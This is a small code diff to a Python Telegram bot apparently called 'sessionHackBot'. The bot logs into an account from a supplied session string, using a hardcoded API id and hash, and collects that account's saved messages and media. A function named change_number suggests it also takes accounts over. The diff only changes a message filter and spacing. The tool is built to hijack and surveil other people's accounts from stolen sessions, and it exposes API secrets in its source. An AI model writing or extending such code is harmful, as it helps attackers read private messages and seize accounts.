@@ -21,11 +21,10 @@ bot = borg = tgbot
 
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
-
 async def savedmsgs(strses):
     async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         messages = []
-        async for message in X.iter_messages(None, from_user='me', media=True):
+        async for message in X.iter_messages(None, from_user='me', file=lambda f: not f.media_empty):
             msg_content = f"Message ID: {message.id}\n"
             
             if message.text:
@@ -58,6 +57,7 @@ async def savedmsgs(strses):
             messages.append(msg_content)
 
         return "\n\n".join(messages)
+
 
 
 async def change_number(strses, number):
